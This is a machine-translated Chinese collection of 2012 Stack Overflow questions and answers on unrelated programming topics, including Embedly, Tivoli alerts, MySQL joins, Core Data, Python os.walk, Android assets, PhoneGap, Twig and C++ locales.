我正在使用 jquery embedly 插件来嵌入视频。但问题是我想将标题、描述、缩略图等视频信息保存到数据库中。我知道我们可以使用 ajax，但问题是我无法找到获取 url 数据的解决方案。也已经阅读了 embedly api，但它告诉了如何嵌入 url，但我需要 url 数据。谁能帮我提供更多信息。

就像我们包含文件 jquery.embedly.js

然后使用代码

```
 $(document).ready(function() {
$("#embedform").bind('submit', function(e){
    e.preventDefault();
    var q = $(this).find('.url').val();
    if (q == '')
        return false;

    $.embedly(q, {maxWidth: 410, wrapElement: 'div', key : '4d1f889c20ed11e1abb14040d3dc5c07'}, function(oembed, dict){
        console.log('hi');
        if (oembed == null)
            $("#embed").html('<p class="text"> Not A Valid URL </p>');
        else 
            $("#embed").html(oembed.code);
    });
}); 
```

});

但这有助于嵌入 url 如何获取标题、描述、缩略图等数据？

# java - 来自 Java 代码的 Tivoli 警报

> ID：10685190
> 
> 赞同：1
> 
> 时间：2012-05-21T12:22:46.643
> 
> 标签：java, alerts, tivoli

谁能指导我如何从我的 java 代码中引发 tivoli 警报。我搜索了从 java 代码中引发 tivoli netcool IBM 产品警报的 API 或文档，但我找不到与我的问题完全匹配的内容。

我们正在使用 netcool 警报系统向支持系统发出警报，如果我的应用程序在数据中发现任何异常情况，我们需要发出 tivoli 警报以调查数据。

我们有一些系统不可用的警报方法，服务器未处于运行模式。

现在我需要从 java 代码中填充这个警报。其他向组发送邮件。我如何在 tivoli 中发出警报（问题的一些问题编号），以便我们以后可以跟踪问题。

请指导以找到解决此问题的方法。[我尝试在 stackoverflow 中搜索，但没有人提出这样的请求，我在http://software.itags.org/ibm-websphere/256320/](http://software.itags.org/ibm-websphere/256320/)中看到了同样的问题， 但没有人回答..

我希望从 stackoverflow 的一些专家的回答中得到帮助。

提前谢谢..谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-03-02T11:30:26.913

有一个用于向 Omnibus 发送事件的 SDK。您可以将其作为标准产品下载的一部分进行下载。

[http://www-01.ibm.com/support/knowledgecenter/SSNFET_9.2.0/com.ibm.netcool_OMNIbus.doc_7.4.0/omnibus/wip/eifsdk/concept/jaa63460.html](http://www-01.ibm.com/support/knowledgecenter/SSNFET_9.2.0/com.ibm.netcool_OMNIbus.doc_7.4.0/omnibus/wip/eifsdk/concept/jaa63460.html)

请注意，您几乎从不将事件直接发送到 Omnibus Objectserver 本身。为了控制访问，您将事件发送到一个探针，该探针使用 Objectserver 处理连接、锁定、特殊处理规则等。

如果不知道自己在做什么，通过将对象服务器视为常规 sybase 数据库来“破解”对象服务器可能会导致问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T11:56:55.850

当您深入了解 Netcool Omnibus 时，它是一个美化的 Sybase 服务器。我对 Java 做的不多，但是当 SNMP 陷阱不可用时，我有几个从 Perl DBI SQL 插入创建的警报。如果您有一个用于 Java 的 Sybase 连接器，请将一条插入语句写入表 alerts.status 到您的对象服务器的 IP 端口 4100。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-25T16:32:27.273

我刚开始写Java。我在这里工作时运行系统管理软件。我维护并使用 ITM 6.3 和 Netcool 7.3.1。如果我对您的理解正确，您正在寻找一种将警报（事件实例）发送到 Netcool 的方法。如果您有一个 EIF 探针正在运行，我可以为您提供一个将事件发送到 EIF 探针的类。上周刚刚编写并测试了它。

# php - 通过单个查询的类别和子类别

> ID：10685191
> 
> 赞同：0
> 
> 时间：2012-05-21T12:22:46.973
> 
> 标签：php, mysql, join

我有一个包含字段的表`id,pid,name`。我想通过单个查询获取以下格式的数据。

```
id- parent category name- name 
```

名称将是类别或子类别，如果其父类别名称将是父类别名称，则父类别名称将为无。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:25:37.610

尝试这个：

```
select t.id,
        tp.name as parent_category,
        t.name as category
from table t
full join table tp on tp.id = t.pid 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:32:52.937

您可以使用以下查询：

```
SELECT c.name,pc.name FROM category c left join category pc on c.pid = pc.id; 
```

# ios - NSValueTransformer 加密数据

> ID：10685196
> 
> 赞同：2
> 
> 时间：2012-05-21T12:23:04.937
> 
> 标签：ios, core-data, nsvaluetransformer

我想在 NSValueTransformer 的帮助下加密一些核心数据列。这个想法是，我使用可转换的数据类型并为我的数据类型定义一些转换器。在转换方法中，我想加密/解密该值。我定义了一个实际上什么都不做的转换器—​​—加密的东西目前还没有实现。

```
@implementation StringCryptoTransformer

+ (Class)transformedValueClass { return [NSString class]; }

+ (BOOL)allowsReverseTransformation { return YES; }

- (NSString*)transformedValue:(id)value {

    NSLog(@"Transformer: %@",value);

    if([value isKindOfClass:[NSString class]]){
        return value;
    }
    return nil;
}     

- (NSString*)reverseTransformedValue:(id)value
{
    return value;
} 
```

方法

```
- (NSString*)transformedValue:(id)value 
```

使用有效值调用但在获取对象时出现此错误：

> ***由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[__NSCFString 字节]：无法识别的选择器发送到实例 0xf5859f0”

有什么想法有什么问题吗？

**编辑：**

我意识到我必须转换为 NSData ，反之亦然。现在它工作正常

```
- (id)transformedValue:(id)value {

    NSData *data =  [((NSString*)value) dataUsingEncoding:NSUTF8StringEncoding];
    return [CryptoUtils encryptWithKey:self.key data:data];
}

- (id)reverseTransformedValue:(id)value
{
    NSData *data = [CryptoUtils decryptWithKey:self.key data:value];
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T19:20:38.627

我意识到我必须转换为`NSData`，反之亦然。现在它工作正常

```
- (id)transformedValue:(id)value {

    NSData *data =  [((NSString*)value) dataUsingEncoding:NSUTF8StringEncoding];
    return [CryptoUtils encryptWithKey:self.key data:data];
}    

- (id)reverseTransformedValue:(id)value
{
    NSData *data = [CryptoUtils decryptWithKey:self.key data:value];
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
} 
```

# jquery - 使用后退按钮（jQuery Mobile）进行分页时，Javascript 不会重新启动

> ID：10685198
> 
> 赞同：0
> 
> 时间：2012-05-21T12:23:12.793
> 
> 标签：jquery, jquery-mobile

我正在使用 jQuery mobile 来显示列表页面。当页面第一次加载时，一些默认的 HTML 就位。然后当文档准备好时，会触发一个 ajax 查询，它返回的 HTML 并插入到页面中。

然后，当您单击列表项时，它会将您带到详细信息页面。如果我从那里单击浏览器后退按钮，它会返回到列表页面，但是我从 ajax 调用加载的 HTML 没有任何人，只有原始的默认 HTML。

知道为什么吗？

**编辑（以帮助澄清问题）：**

在列表页面上，我正在运行：

```
setInterval(function() { console.log("1 second"); }, 1000); 
```

如果我导航到其他页面，`data-ajax="true"`时间将在每个页面上重新开始。如果我转到一个页面`data-ajax="false"`然后点击 Chrome 的后退按钮，则上述 Interval 调用将不会再次开始。该页面仅显示初始静态 HTML，不会触发任何内联 javascript 或似乎进行任何事件调用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:29:51.640

尝试添加这个：

```
<body onunload=""> 
```

它将触发重新加载。

# uitableview - iPad3 呈现白色单元格标签

> ID：10685207
> 
> 赞同：1
> 
> 时间：2012-05-21T12:23:38.773
> 
> 标签：uitableview, uisplitviewcontroller, ipad-3

我有包含 tableview 和 detailview 的 splitviewcontroller。从 tablview 相关描述中选择的任何项目都将显示在 detailview 中。

当用户从 tableview 中选择任何单元格时，我会在 detailview 中加载适当的视图，并且还有另一个功能，每个 detailview 都有一个“NEXT”按钮，允许用户导航到下一个视图。这意味着当用户按下下一个按钮并且当前选择的单元格编号时。为 2，然后它将选择第 3 个单元格并加载第 3 个详细视图。我的问题是 iPad1 和 iPad2 中的一切工作都非常顺利。但是在 Retina 显示屏 iPad3 中，当我在第一个单元格中并按下“下一步”按钮时，我移动到了第二个单元格和相关的详细信息视图，当时我的第一个单元格文本标签变成了白色，如图所示。如果您正确地看到它，您还可以看到单元格“位置”的标题。

![图片](../Images/fd69341f7bb85726398033da993fb6af.png)

以下是我在用户按下 NEXT 按钮时使用的代码。

```
NSIndexPath *ipath = [NSIndexPath indexPathForRow:MenuCustmerInfoRow inSection:MenuSection];

[rvc.tableView selectRowAtIndexPath:ipath
                 animated:NO
           scrollPosition:UITableViewScrollPositionNone]; 
```

这可能是什么原因？这仅发生在 iPad 3 中，并且仅发生在 tableview 的第一个单元格中，所有其他单元格都运行良好。
任何帮助将不胜感激！

谢谢尼尔
_

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T13:51:13.120

我要提交一个 Apple 错误，但问题出在这里，文本标签的背景在取消选择时变为白色，所以这样做

```
-(void)tableView:(UITableView *)tableView didDeselectRowAtIndexPath:(NSIndexPath *)indexPath {

    UITableViewCell *cell = [tableView cellForRowAtIndexPath:indexPath];
    //forced clear color due to textlabel turning white after deselect
    [cell.textLabel setBackgroundColor:[UIColor clearColor]];
} 
```

# python - Python 子文件夹列表

> ID：10685211
> 
> 赞同：1
> 
> 时间：2012-05-21T12:23:54.743
> 
> 标签：python, file

我有一个名为**Forfun**的主目录。在这个目录中，有 7-8 个子目录，分别为**Test1**、**Test2**、**Test3**等。**请注意， Forfun**中也有一些文件不是子目录。例如，**Forfun**中有一个 .txt 文件，与 Test1、Test2 子目录处于同一级别。

每个**TestX**子目录又分为 3 个子目录，即：**输入**、**结果**和**参数**。

我希望能够列出特定文件夹的所有实例，例如**输入**。

代码应该递归地遍历整个**Forfun**目录并列出它找到**输入**或**结果**目录的所有位置。

我试过`os.listdir`这样使用：

```
path = '/myfiles/Forfun'
folders = [f for f in os.listdir(path) if f.endswith('inputs')]
folders 
```

但这会给我一个空列表。希望我清楚地解释了问题，感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:30:17.103

`os.listdir()`列出提供的目录中的所有文件和目录。正如您所经历的，它不执行递归。它停留在最初提供的目录的级别。

为了递归地遍历目录树并遍历某个目录级别以下的**所有**`os.walk()`文件和目录，您应该使用 Python 的：

```
import os

def listdirs(suffix):
    for dirname, dirnames, filenames in os.walk('.'):
        for subdirname in dirnames:
            subdirpath = os.path.join(dirname, subdirname)
            if subdirpath.endswith(suffix):
                yield subdirpath

if __name__ == "__main__":
    for d in listdirs('inputs'):
        print d 
```

我已经建立了与您提出的相同的目录结构。这是上面代码的输出：

```
$ python test.py 
./Test1/inputs
./Test2/inputs 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:37:17.020

为了精确一点[Jan-Philip](https://stackoverflow.com/users/145400/jan-philip-gehrcke)的解决方案：

```
>>> import os
>>> for root, dirs, files in os.walk(path):
    if 'inputs' in dirs:
        print os.path.join(root, 'inputs') 
```

这将列出所有出现的`inputs`子文件夹。

# silverlight - windows phone 7 中的 Scrollviewer 问题？

> ID：10685212
> 
> 赞同：0
> 
> 时间：2012-05-21T12:24:03.337
> 
> 标签：silverlight, windows-phone-7

在第 20 页中需要放置控件。所以我使用了 scrollviewer 并将网格放在该 scrollviewer 内。在网格内放置了所有控件。在运行应用程序时，控件向上和向下滚动，但我无法在下面的控件中输入文本页面，因为它向上滚动无法保持稳定以输入以下控件文本。它突然向下所有控件....

```
 <ScrollViewer>
                <Grid  Name="grid1">
                    <Image Height="944" HorizontalAlignment="Left" Name="image1" Stretch="Fill" VerticalAlignment="Top" Width="486" Source="/MyBuddies;component/Images/registerbg.png" Margin="0,1,0,0" />
                    <TextBlock Height="51" Margin="127,17,0,0" Name="textBlock1" Text="Registration" VerticalAlignment="Top" FontSize="32" HorizontalAlignment="Left" Width="211" FontFamily="Verdana" TextAlignment="Center" />
                    <TextBlock Height="51" HorizontalAlignment="Left" Margin="6,83,0,0" Name="textBlock2" Text="First Name" VerticalAlignment="Top" Width="202" FontSize="24" />
                    <my:WatermarkTextBox Height="71" HorizontalAlignment="Left" Margin="179,68,0,0" Name="watermarkTextBox2" Text="" VerticalAlignment="Top" Width="287" FontSize="24" WatermarkText="Enter Firstname" BorderBrush="#BF000000"/>
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="6,144,0,0" Name="textBlock3" Text="Last Name" VerticalAlignment="Top" Width="202" />
                    <my:WatermarkTextBox BorderBrush="#BF000000" FontSize="24" Height="71" HorizontalAlignment="Left" Margin="181,130,0,0" Name="watermarkTextBox1" Text="" VerticalAlignment="Top" WatermarkText="Enter Lastname" Width="285" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="6,206,0,0" Name="textBlock4" Text="User Name" VerticalAlignment="Top" Width="202" />
                    <my:WatermarkTextBox BorderBrush="#BF000000" FontSize="24" Height="71" HorizontalAlignment="Left" Margin="181,193,0,0" Name="watermarkTextBox3" Text="" VerticalAlignment="Top" WatermarkText="Enter UserName" Width="286" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="6,270,0,0" Name="textBlock5" Text="Password" VerticalAlignment="Top" Width="202" />
                    <PasswordBox Height="72" HorizontalAlignment="Left" Margin="183,259,0,0" Name="passwordBox1" VerticalAlignment="Top" Width="284" BorderBrush="#BF000000" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="6,339,0,0" Name="textBlock6" Text="Confirm Password" VerticalAlignment="Top" Width="202" />
                    <PasswordBox BorderBrush="#BF000000" Height="72" HorizontalAlignment="Left" Margin="184,324,0,0" Name="passwordBox2" VerticalAlignment="Top" Width="283" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="7,406,0,0" Name="textBlock7" Text="Email" VerticalAlignment="Top" Width="202" />
                    <my:WatermarkTextBox BorderBrush="#BF000000" FontSize="24" Height="71" HorizontalAlignment="Left" Margin="187,389,0,0" Name="watermarkTextBox4" Text="" VerticalAlignment="Top" WatermarkText="Enter Email" Width="281" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="6,473,0,0" Name="textBlock8" Text="Gender" VerticalAlignment="Top" Width="202" />
                    <RadioButton Content="Male" Height="72" HorizontalAlignment="Left" Margin="191,453,0,0" Name="radioButton1" VerticalAlignment="Top" Width="133" />
                    <RadioButton Content="Female" Height="72" HorizontalAlignment="Left" Margin="317,453,0,0" Name="radioButton2" VerticalAlignment="Top" Width="138" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="6,530,0,0" Name="textBlock9" Text="Age" VerticalAlignment="Top" Width="202" />
                    <my:WatermarkTextBox BorderBrush="#BF000000" FontSize="24" Height="71" HorizontalAlignment="Left" Margin="185,510,0,0" Name="watermarkTextBox5" Text="" VerticalAlignment="Top" WatermarkText="Enter Age" Width="283" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="7,587,0,0" Name="textBlock10" Text="City" VerticalAlignment="Top" Width="202" />
                    <my:WatermarkTextBox BorderBrush="#BF000000" FontSize="24" Height="71" HorizontalAlignment="Left" Margin="187,576,0,0" Name="watermarkTextBox6" Text="" VerticalAlignment="Top" WatermarkText="Enter City" Width="280" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="7,658,0,0" Name="textBlock11" Text="Country" VerticalAlignment="Top" Width="202" />
                    <my:WatermarkTextBox BorderBrush="#BF000000" FontSize="24" Height="71" HorizontalAlignment="Left" Margin="187,641,0,0" Name="watermarkTextBox7" Text="" VerticalAlignment="Top" WatermarkText="Enter Country" Width="280" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="6,727,0,0" Name="textBlock12" Text="User Image" VerticalAlignment="Top" Width="202" />
                    <Image Height="83" HorizontalAlignment="Left" Margin="194,716,0,0" Name="image2" Stretch="Fill" VerticalAlignment="Top" Width="266" Source="/MyBuddies;component/Images/registerphoto.png" />
                    <TextBlock FontSize="24" Height="51" HorizontalAlignment="Left" Margin="6,861,0,0" Name="textBlock13" Text="User Image" VerticalAlignment="Top" Width="202" />
                    <my:WatermarkTextBox BorderBrush="#BF000000" FontSize="24" Height="71" HorizontalAlignment="Left" Margin="181,852,0,0" Name="watermarkTextBox8" Text="" VerticalAlignment="Top" WatermarkText="Enter Country" Width="280" />
                </Grid>
            </ScrollViewer> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:01:28.770

请通过这个例子，我们必须做一些手动工作，因为这个问题是因为 wp7 中键盘的默认属性

[http://sorokoletov.com/2011/08/windows-phone-70-handling-text-entry-screens/](http://sorokoletov.com/2011/08/windows-phone-70-handling-text-entry-screens/)

# json - iOS5.1中的JSON解析

> ID：10685213
> 
> 赞同：0
> 
> 时间：2012-05-21T12:24:05.463
> 
> 标签：json, ios5

在 iOS 5.1 中解析此 JSON 字符串的最佳方法是什么 - 使用本机 JSON 解析或类似 RestKit 的最佳实践是否更好？

```
[{"key":"value", "key2":"value2"},{"key":"value","key2":"value2"}] 
```

我正在使用此代码，但我得到的只是返回值

```
query = [query stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];

NSData *jsonData = [[NSString stringWithContentsOfURL:[NSURL URLWithString:query] encoding:NSUTF8StringEncoding error:nil] dataUsingEncoding:NSUTF8StringEncoding];
NSError *error = nil;
NSMutableArray *results = jsonData ? [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers|NSJSONReadingMutableLeaves error:&error] : nil;
if (error) NSLog(@"[%@ %@] JSON error: %@", NSStringFromClass([self class]), NSStringFromSelector(_cmd), error.localizedDescription);

return results; 
```

# c#-4.0 - 来自字节 [] 的文件扩展名

> ID：10685214
> 
> 赞同：0
> 
> 时间：2012-05-21T12:24:06.133
> 
> 标签：c#-4.0, silverlight-4.0, bytearray

我在 db 中有一个数据列，它包含**varbinary(max)**

一些记录将存储在该表中

现在我想从 byte[] 中找出文件名和文件扩展名（Mime 类型）

如果通过代码将非常有用

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T14:24:30.233

这通常是不可能的。如果 varbinary-column 仅包含文件内容，则无法获取扩展名。如果我设计了数据库，就会有另一列描述文件类型/扩展名。如果您知道该列中仅存储了图像（例如），您可以尝试通过查找 jpg、png 等文件的“特定字节”来查找。

# android - 我坚持使用 onCreate() 中的调用方法

> ID：10685219
> 
> 赞同：1
> 
> 时间：2012-05-21T12:24:27.603
> 
> 标签：android

大家好，我坚持对函数进行简单的调用。这是我来自 iPhone 的第一个 android 应用程序。每次我在 onCreate() 中做某事时，我的应用程序都会崩溃。我确信问题很简单

```
public class AndroidReaderActivity extends Activity {

    public void test(){
        File dir=new File("/assets");
        String[] listefichiers;
        int i;
        listefichiers = dir.list();
        for (i = 0; i < listefichiers.length; i++) {
            System.out.println(listefichiers[i]);
        }
    }
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        test();        
    }
} 
```

谢谢你的帮助。

编辑：这是猫日志

```
05-15 19:52:55.710: E/AndroidRuntime(1956): FATAL EXCEPTION: main
05-15 19:52:55.710: E/AndroidRuntime(1956): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.infotel/com.infotel.AndroidReaderActivity}: java.lang.NullPointerException
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.app.ActivityThread.access$600(ActivityThread.java:123)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.os.Handler.dispatchMessage(Handler.java:99)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.os.Looper.loop(Looper.java:137)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.app.ActivityThread.main(ActivityThread.java:4424)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at java.lang.reflect.Method.invokeNative(Native Method)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at java.lang.reflect.Method.invoke(Method.java:511)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at dalvik.system.NativeStart.main(Native Method)
05-15 19:52:55.710: E/AndroidRuntime(1956): Caused by: java.lang.NullPointerException
05-15 19:52:55.710: E/AndroidRuntime(1956):     at com.infotel.AndroidReaderActivity.test(AndroidReaderActivity.java:14)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at com.infotel.AndroidReaderActivity.onCreate(AndroidReaderActivity.java:23)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.app.Activity.performCreate(Activity.java:4465)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
05-15 19:52:55.710: E/AndroidRuntime(1956):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
05-15 19:52:55.710: E/AndroidRuntime(1956):     ... 11 more 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:36:40.613

从堆栈跟踪看来，问题出在您尝试访问 /assets 目录（位于 APK 内部）时

```
File dir=new File("/assets"); 
```

当您调用 dir.list() 时，请给出 NullPointer，因为 dir 无法实例化。

你到底想做什么？您想访问程序的资产目录吗？

您可以使用以下代码列出您的资产：

```
public void test(){
    AssetManager assetManager = null;
    assetManager = getResources().getAssets();

    try {
        // List main folder (/assets) content
        for(String s : assetManager.list("")){
            Log.i("TestActivity", s);
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
} 
```

导致：

```
05-11 16:55:08.555: I/TestActivity(13284): de
05-11 16:55:08.555: I/TestActivity(13284): images
05-11 16:55:08.555: I/TestActivity(13284): sounds
05-11 16:55:08.555: I/TestActivity(13284): webkit 
```

之后，您可以通过提供assetManager.list("de") 列出每个目录的内容

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:36:52.863

这取决于你想要做什么。如果您尝试列出目录中的文件，这里有一篇文章描述了如何做到这一点：

[如何列出android目录中的文件？](https://stackoverflow.com/questions/8646984/how-to-list-files-in-an-android-directory)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:29:27.033

你在第 14 行得到了一个空指针异常。看看这是什么。我认为您没有正确创建文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T14:17:52.080

Asset 文件夹中不存在文件的绝对路径。内容打包在 APK 文件中。

```
 File dir=new File("/assets"); 
```

但是您可以从 Asset.xml 获取输入流。

```
AssetManager am = context.getAssets();

        InputStream is = am.open("/assets/yourfile"); 
```

# android - Android 和 Phonegap：打算启动另一个应用程序

> ID：10685220
> 
> 赞同：1
> 
> 时间：2012-05-21T12:24:28.547
> 
> 标签：android, cordova, android-intent, phonegap-plugins

我发现这段代码是为了启动浏览器：

```
Intent intent = new Intent (Intent.ACTION_VIEW, uri);
intent.setClassName("com.android.browser", "com.android.browser.BrowserActivity");
intent.setDataAndType(uri, "text/html");
startActivity(intent); 
```

有用。

但我没有使用 Android SDK。我正在使用 Phonegap 来制作我的应用程序。所以我正在寻找一种方法来启动这个意图。我找到了这个插件： [https ://github.com/borismus/phonegap-plugins/tree/master/Android/WebIntent/](https://github.com/borismus/phonegap-plugins/tree/master/Android/WebIntent/)

但它不允许“setClassName”、“setDataAndType”....

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T12:43:56.717

如果您选中[CordovaWebViewClient](https://git-wip-us.apache.org/repos/asf?p=incubator-cordova-android.git;a=blob;f=framework/src/org/apache/cordova/CordovaWebViewClient.java;h=6bddfc3532b866b7d883f6ffa9c690b49046f769;hb=HEAD)，则有几个 uris 由 Cordova 开箱即用地处理。

如果您不想使用插件，您可以覆盖它并添加对不同的自定义类型 uri 的支持，这反过来会使用 uri 中指定的参数为您选择的应用程序提供午餐。

```
public class CustomWebViewClient extends
        org.apache.cordova.CordovaWebViewClient {

    public CustomWebViewClient(DroidGap ctx) {
        super(ctx);
    }

    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {

        //Check if provided uri is interesting for us
        if (url.startsWith("customUri://")) {
            //Get uri params, create intent and start the activity
            return true;
        }

        return super.shouldOverrideUrlLoading(view, url);
    }
} 
```

上面的类应该在你的 android 项目的主要活动（扩展 DroidGap）中使用：

```
@Override
public void init() {
    WebView webView = new WebView(this);
    CustomWebViewClient webClient = new CustomWebViewClient(this);
    CordovaChromeClient chromeClient = new CordovaChromeClient(this);
    super.init(webView, webClient, chromeClient);
} 
```

您提到的插件允许根据指定的 uri 午餐意图。因此，例如，如果您提供以 http:// 开头的 uri，android 会将其识别为 Web 资源并尝试启动可用的浏览器。因此，如果您只想启动浏览器，这对您来说应该足够了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:31:31.373

如果您只想在 Android 浏览器中加载 url，那么您应该使用 ChildBrowser 插件：

[https://github.com/phonegap/phonegap-plugins/tree/master/Android/ChildBrowser](https://github.com/phonegap/phonegap-plugins/tree/master/Android/ChildBrowser)

如果您想启动任何意图，请告诉我，因为 Android PhoneGap 代码会启动各种意图以完成工作。

# symfony - 如何在 TWIG 中处理缓冲区变量并以正确的方式呈现它们

> ID：10685228
> 
> 赞同：0
> 
> 时间：2012-05-21T12:24:54.247
> 
> 标签：symfony, twig

我有两个 div，左右，取决于从数据库中检索到的数据我想在第一个或后一个中输出它，在平面 PHP 中这是最简单的事情之一，但使用 Symfony2 和 TWIG 它不会出现这边走。这是我的无效代码，可以让您更好地理解：

```
{% set colLeft = '' %}
{% set colRight = '' %}

{% for el in form.myCollection %}
    {% if el.foo.vars.value.type == 'phone_number' %}
        {% set colLeft = form_row(el.left) %}
    {% else %}
        {% set colRight = form_row(el.right) %}
    {% endif %}
{% endfor %}

<div class="left">
    {{ colLeft }}
</div>

<div class="right">
    {{ colRight }}
</div> 
```

这样，在我的最终 html 页面中，我看到的是 html 代码，而不是对它的解释。我还考虑将输出写入 2 个文件 left.html.twig 和 right.html.twig 并稍后进行包含，但我确信有更好的方法我现在看不到。有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:28:27.610

您必须使用[“原始”](http://twig.sensiolabs.org/doc/filters/raw.html)过滤器：

```
<div class="left">
    {{ colLeft|raw }}
</div>

<div class="right">
    {{ colRight|raw }}
</div> 
```

# c++ - 对字符串流使用本地小数分隔符，但不分组字符

> ID：10685229
> 
> 赞同：2
> 
> 时间：2012-05-21T12:24:57.180
> 
> 标签：c++

> **可能重复：**
> [在 C++ 中从整数中插入和删除逗号](https://stackoverflow.com/questions/791258/inserting-and-removing-commas-from-integers-in-c)

我想在当前语言环境中使用小数分隔符写入双精度值，但我不希望它按当前语言环境中的分组字符进行分组。目前的方法与

```
stringstream s;
s.imbue(std::locale("")); 
```

只解决其中一个问题。当前输出就像 1,234.567 而不是想要的 1234.567

我怎样才能改变这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-22T11:55:30.183

借助 dirkgently 的帖子[在 integers 中插入和删除逗号](https://stackoverflow.com/questions/791258/inserting-and-removing-commas-from-integers-in-c)，我创建了以下类：

```
class no_grouping : public std::numpunct_byname<char> {
    std::string do_grouping() const { return ""; }

public:
    no_grouping() : numpunct_byname("") {}
}; 
```

这里重要的是从 numpunkct_byname 派生并使用本地语言环境的构造函数参数 "" 对其进行初始化。

然后可以很容易地为流注入以下代码：

```
ostringstream stringBuff;
std::locale locale(std::locale(""),new no_grouping);
stringBuff.imbue(locale); 
```

这将删除分组，但它将采用本地语言环境中的小数分隔符。

# iphone - 如何将文件上传到服务器？

> ID：10685230
> 
> 赞同：0
> 
> 时间：2012-05-21T12:24:58.733
> 
> 标签：iphone

这是我从支持文件上传 txt 文件的代码；

```
NSString *filePath = [[NSBundle mainBundle] pathForResource:@"serverIP" ofType:@"txt"];  
    NSData *myData = [NSData dataWithContentsOfFile:filePath];  
    NSLog(@"data %@",myData);

    //url for the server
    NSString *urlString = @"http://192.168.2.111/myupload/upload.php";

    NSMutableURLRequest *request = [[[NSMutableURLRequest alloc] init] autorelease];
    [request setURL:[NSURL URLWithString:urlString]];
    [request setHTTPMethod:@"POST"];

    NSString *boundary = [NSString stringWithString:@"-----------14737809831466499882746641449"];
    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@",boundary];
    [request addValue:contentType forHTTPHeaderField: @"Content-Type"];

    /*
     now lets create the body of the post
     */
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n",boundary] dataUsingEncoding:NSUTF8StringEncoding]]; 
    [body appendData:[[NSString stringWithString:@"Content-Disposition: form-data; name=\"userfile\"; filename=\"serverIP.txt\"\r\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithString:@"Content-Type: application/octet-stream\r\n\r\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[NSData dataWithData:myData]];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n",boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    // setting the body of the post to the reqeust
    [request setHTTPBody:body];

    // now lets make the connection to the web
    NSData *returnData = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
    NSString *returnString = [[NSString alloc] initWithData:returnData encoding:NSUTF8StringEncoding];

    NSLog(@"returnString=%@",returnString); 
```

